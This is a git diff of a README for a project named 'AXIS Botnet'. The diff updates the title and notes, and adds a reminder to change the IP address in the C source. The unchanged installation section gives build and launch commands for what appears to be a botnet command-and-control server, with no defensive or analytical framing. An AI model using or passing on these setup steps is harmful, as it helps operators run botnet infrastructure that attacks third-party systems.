@@ -1,11 +1,12 @@
-# AXIS Botnet
+# AXIS Botnet new
 
 ### INFO:
-This project is no longer supported; it has been replaced by the Orbital Cannon.
+Fixed compiler and some bug in script 
 
 ### Installation:
 * Linux only:
   * **recommended to use Centos 7**
+  * `important don't forget to change ip in AXIS_CC.c`
   * `sudo python3 build.py AXIS_CC.c (server-ip)`
   * `gcc AXIS_CNC.c -o AXIS -pthread`
   * `sudo screen ./AXIS 606 1 909`
